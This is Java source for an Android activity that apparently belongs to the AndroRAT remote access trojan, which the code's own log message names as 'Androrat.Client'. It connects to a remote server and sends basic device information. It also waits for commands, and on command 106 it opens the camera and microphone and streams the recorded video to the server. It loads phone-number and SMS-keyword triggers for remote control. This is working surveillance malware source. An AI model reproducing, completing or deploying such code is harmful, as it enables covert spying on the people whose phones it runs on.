package my.app.activityclient;

import inout.Protocol;
import inout.Controler;

import java.io.IOException;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.StringTokenizer;
import java.util.prefs.Preferences;
import out.Connection;
import my.app.Library.CallMonitor;
import my.app.Library.SystemInfo;
import android.hardware.Camera.PictureCallback;
import Packet.*;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.hardware.Camera;
import android.location.Address;
import android.media.MediaRecorder;
import android.net.LocalServerSocket;
import android.net.LocalSocket;
import android.net.LocalSocketAddress;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.util.Log;
import android.widget.Toast;
import Packet.CommandPacket;
import Packet.LogPacket;
import Packet.PreferencePacket;
import Packet.TransportPacket;
import android.app.Activity;
import android.view.SurfaceHolder;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.EditText;
import android.view.SurfaceView;


public class LauncherActivity extends ClientListener implements Controler, SurfaceHolder.Callback, OnClickListener {
    /** Called when the activity is first created. */
	
	public final String TAG = LauncherActivity.class.getSimpleName();
	Connection conn;

	int nbAttempts = 10; //sera décrementé a 5 pour 5 minute 3 pour  10 minute ..
	int elapsedTime = 1; // 1 minute
	
	boolean stop = false; //Pour que les threads puissent s'arreter en cas de déconnexion
	
	boolean isRunning = false; //Le service tourne
	boolean isListening = false; //Le service est connecté au serveur
	//final boolean waitTrigger = false; //On attend un évenement pour essayer de se connecter.
	Thread readthread;
	ProcessCommand procCmd ;
	byte[] cmd ;
	CommandPacket packet ;
	
	//--added photo
	Camera cam;
	byte[] image;
	int tmpch;
	//-------------
	
	//-- added Video
	private boolean isRecording = false;
	private Camera camera;
	private MediaRecorder mMediaRecorder;
	private SurfaceHolder holder;
	private Button captureButton;
	boolean started = false;
	
	public static String SOCKET_ADDRESS = "myLocalSocket";

	LocalSocket ls;
	
	ClientListener ctx;
	Thread th;
	int channel;
	byte[] tmp;
	
	byte[] header = {0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 8, 109, 100, 97, 116};
	byte[] pattern = {0, 0, -128, 2, 28, -32, 1, 0, 17, 19, -29, -61};
	boolean headerfound = false;
	int count = 0;
	//-------------
	
	private Handler handler = new Handler() {
		
		public void handleMessage(Message msg) {
			Bundle b = msg.getData();
			processCommand(b);
		}
	};
	
	Button btnStart, btnStop;
	EditText ipfield, portfield;
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
       
        
        ipfield = (EditText) findViewById(R.id.ipfield);
        portfield =(EditText) findViewById(R.id.portfield);
        
        captureButton = (Button) findViewById(R.id.button_capture);
        captureButton.setOnClickListener(this);
        
        //onStartCommand();
        
        SurfaceView cameraView = (SurfaceView) findViewById(R.id.camera_preview);
        holder = cameraView.getHolder();
        holder.addCallback(this);
        holder.setType(SurfaceHolder.SURFACE_TYPE_PUSH_BUFFERS);
        //constructorVideo();
    }
    
    
    
	public void onStartCommand() {
		Log.i(TAG, "In onCreate");
		infos = new SystemInfo(this);
		procCmd = new ProcessCommand(this);
		
		loadPreferences();
		this.ip = ipfield.getText().toString();
		this.port = new Integer(portfield.getText().toString());		
		//this.ip = "192.168.0.12";
		//this.port = 9999;
		
		
		if(!isRunning) {// C'est la première fois qu'on le lance
		  	//--- On ne passera qu'une fois ici ---
			isRunning = true;
			conn = new Connection(ip,port,this);//On se connecte et on lance les threads
			Log.i(TAG,"Try to connect to "+ip+":"+port);
			if(conn.connect()) {
				packet = new CommandPacket();
				readthread = new Thread(new Runnable() { public void run() { waitInstruction(); } });
				readthread.start(); //On commence vraiment a écouter
				CommandPacket pack = new CommandPacket(Protocol.CONNECT, 0, infos.getBasicInfos());
				handleData(0,pack.build());					
				//gps = new GPSListener(this, LocationManager.NETWORK_PROVIDER,(short)4); //!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
				isListening = true;
				Toast.makeText(getApplicationContext(), "Connected!", Toast.LENGTH_LONG).show();
			}
			else {
				Toast.makeText(getApplicationContext(), "Connection failed", Toast.LENGTH_LONG).show();
			}
		}
	}
	
	
	
	public void waitInstruction() { //Le thread sera bloqué dedans
		try {
			for(;;) {
				if(stop)
					break;
				conn.getInstruction() ;
			}
		}
		catch(Exception e) { 
			isListening = false;
			//Toast.makeText(getApplicationContext(), "Client disconnected !", Toast.LENGTH_LONG).show();
		}
	}
	
	public void processCommand(Bundle b)
    {
		try{
			short com = b.getShort("command");
			byte[] args = b.getByteArray("arguments");
			int ch = b.getInt("chan");
			if(com == 106) {
				tmpch = ch;
				constructorVideo();
				start();
				//captureButton.performClick();
			}
			else if(com == 107) {
				stop();
				//captureButton.performClick();
			}
			else
				procCmd.process(com,args,ch);
		}
		catch(Exception e) {
			sendError("Error on Client:"+e.getMessage());
		}
    }
	
	public void constructorVideo() {
		//ctx = c;	
		//this.channel = chan;
		
        th = new Thread(new Runnable() {
        	
        	public void run() { listen(); }
        });
		th.start();
        
		try { Thread.sleep(1000); } catch (Exception e) {}
		
		ls = new LocalSocket();
        try {
			ls.connect(new LocalSocketAddress(SOCKET_ADDRESS));
		} catch (IOException e) {
			//stop();
		}
        camera = Camera.open();
       

	}
	
    public void start() {
    	if (prepareVideoRecorder()) {

            mMediaRecorder.start();
            captureButton.setText("Stop");
            isRecording = true;
        } else {
            releaseMediaRecorder();
        } 
    }
    
    public void stop() {
        if (isRecording) {
        	//constructorVideo();
            mMediaRecorder.stop();
            releaseMediaRecorder();
            camera.lock();

            captureButton.setText("Start");
            isRecording = false;
        }
    }
    
    @Override
    protected void onPause() {
        super.onPause();
        releaseMediaRecorder();       // if you are using MediaRecorder, release it first
        releaseCamera();              // release the camera immediately on pause event
    }
	
	
	public void onClick(View v) {
		if(started) {
			//destroyMe();
			started = false;
			finish();
		}
		else {
			onStartCommand();
			started = true;
		}
		/*
        if (isRecording) {
            mMediaRecorder.stop();
            releaseMediaRecorder();
            camera.lock();

            captureButton.setText("Capture");
            isRecording = false;
        } else {
            if (prepareVideoRecorder()) {

                mMediaRecorder.start();
                captureButton.setText("Stop");
                isRecording = true;
            } else {
                releaseMediaRecorder();
            }
        }*/
		
	}
   
	
    public void listen() {
        try {
            LocalServerSocket server = new LocalServerSocket(SOCKET_ADDRESS);

            LocalSocket receiver = server.accept();
            if (receiver != null) {
                InputStream input = receiver.getInputStream();
                
                byte[] buffer = new byte[1024];
                // simply for java.util.ArrayList
                boolean rec = true;
                while(rec) {
	                int read = input.read(buffer);
	                if(read == -1) {
	                	rec = false;
	                	Log.e(TAG,"-1 read in socket");
	                	break;
	                }
	                if(!isRecording)
	                	rec= false;
	                if(!headerfound) {
	                	int i = ByteArrayFinder.find(buffer, pattern);
	                	if(i != -1) {
	                		headerfound = true;
	                		handleData(tmpch, header);
	                		handleData(tmpch, pattern);
	                		try {
	    	                tmp = new byte[read-(i+pattern.length)];
	    	                System.arraycopy(buffer, i+pattern.length, tmp, 0, read-(i+pattern.length));
	    	                handleData(tmpch, tmp);
	    	                Log.i(TAG,"Paquet: "+count);
	    	                count++;
	                		} catch(Exception e) {}
	                	}
	                }
	                else {
		                tmp = new byte[read];
		                System.arraycopy(buffer, 0, tmp, 0, read);
		                handleData(tmpch, tmp);
    	                Log.i(TAG,"Paquet: "+count);
    	                count++;
	                }
	                //out.write(buffer, 0, readed);
                }
                headerfound = false;
            }
        } catch (IOException e) {
            Log.e(getClass().getName(), e.getMessage());
        }
    }
	
    private boolean prepareVideoRecorder(){
        mMediaRecorder = new MediaRecorder();

        // Step 1: Unlock and set camera to MediaRecorder
        camera.unlock();
        mMediaRecorder.setCamera(camera);

        // Step 2: Set sources
        mMediaRecorder.setAudioSource(MediaRecorder.AudioSource.DEFAULT);
        mMediaRecorder.setVideoSource(MediaRecorder.VideoSource.DEFAULT);

        // Step 3: Set a CamcorderProfile (requires API Level 8 or higher)
        //mMediaRecorder.setProfile(CamcorderProfile.get(CamcorderProfile.QUALITY_HIGH));
 
        
        // Step 3: Set output format and encoding (for versions prior to API Level 8)
        mMediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
        mMediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.DEFAULT);
        mMediaRecorder.setVideoEncoder(MediaRecorder.VideoEncoder.H263);
        
        // Step 4: Set output file
        mMediaRecorder.setOutputFile(ls.getFileDescriptor());
        
        // Step 5: Set the preview output
        //mMediaRecorder.setPreviewDisplay(mPreview.getHolder().getSurface());
        mMediaRecorder.setPreviewDisplay(holder.getSurface());
        
        Log.i(TAG, "Surface valid: "+holder.getSurface().isValid());

        /*mMediaRecorder.setVideoSize(176, 144);
        mMediaRecorder.setVideoFrameRate(20);
        mMediaRecorder.setAudioChannels(1);
        */
        
        // Step 6: Prepare configured MediaRecorder
        try {
            mMediaRecorder.prepare();
        } catch (Exception e) {
            Log.d(TAG, "Exception preparing MediaRecorder: " + e.getMessage());
            releaseMediaRecorder();
            return false;
        }
        return true;
    }
	
    
    private void releaseMediaRecorder(){
        if (mMediaRecorder != null) {
            mMediaRecorder.reset();
            mMediaRecorder.release();
            mMediaRecorder = null;
            camera.lock();
        }
    }
	
    private void releaseCamera(){
        if (camera != null){
            camera.release();        // release the camera for other applications
            camera = null;
        }
    }
    
	public void loadPreferences() {
		PreferencePacket p = procCmd.loadPreferences();
		waitTrigger = p.isWaitTrigger();
		ip = p.getIp();
		port = p.getPort();
		authorizedNumbersCall = p.getPhoneNumberCall();
		authorizedNumbersSMS = p.getPhoneNumberSMS();
		authorizedNumbersKeywords = p.getKeywordSMS();
	}
	
	public void sendInformation(String infos) { //Methode que le Client doit implémenter pour envoyer des informations
		conn.sendData(1, new LogPacket(System.currentTimeMillis(),(byte) 0, infos).build());
	}
	
	public void sendError(String error) { //Methode que le Client doit implémenter pour envoyer des informations
		conn.sendData(1, new LogPacket(System.currentTimeMillis(),(byte) 1, error).build());
	}
	
	public void handleData(int channel, byte[] data) {
		conn.sendData(channel, data);
	}

	public void destroyMe() {
		onDestroy();
	}
	public void onDestroy() {
		//savePreferences("myPref");
		//savePreferences("preferences");
		if(!isRecording) {
			Log.i(TAG, "in onDestroy");
			if(conn != null) {
				try {
					conn.stop();
				}
				catch(Exception e) {
					Log.i(TAG, "Error in socket close: "+e.getMessage());
				}
			}
			stop = true;
			super.onDestroy();
		}
	}
	
	public void Storage(TransportPacket p, String i) 
	{
		try
		{
			packet = new CommandPacket(); //!!!!!!!!!!!! Sinon on peut surement en valeur les arguments des command précédantes !
			packet.parse(p.getData());
			
			Message mess = new Message();
			Bundle b = new Bundle();
			b.putShort("command", packet.getCommand());
			b.putByteArray("arguments", packet.getArguments());
			b.putInt("chan", packet.getTargetChannel());
			mess.setData(b);
			handler.sendMessage(mess);
		}
		catch(Exception e)
		{
			System.out.println("Androrat.Client.storage : pas une commande");
		}		
	}



	public void surfaceChanged(SurfaceHolder holder, int format, int width,
			int height) {
		// TODO Auto-generated method stub
		
	}



	public void surfaceCreated(SurfaceHolder holder) {
		// TODO Auto-generated method stub
		
	}



	public void surfaceDestroyed(SurfaceHolder holder) {
		// TODO Auto-generated method stub
		
	}


	static class ByteArrayFinder {  
		public static int find(byte[] source, byte[] match) {
			// sanity checks
			if (source == null || match == null)
				return -1;
			if (source.length == 0 || match.length == 0)
				return -1;
			int ret = -1;
			int spos = 0;
			int mpos = 0;
			byte m = match[mpos];
			for (; spos < source.length; spos++) {
				if (m == source[spos]) {
					// starting match
					if (mpos == 0)
						ret = spos;
					// finishing match
					else if (mpos == match.length - 1)
						return ret;
					mpos++;
					m = match[mpos];
				} else {
					ret = -1;
					mpos = 0;
					m = match[mpos];
				}
			}
			return ret;
		}
	};
    
    
}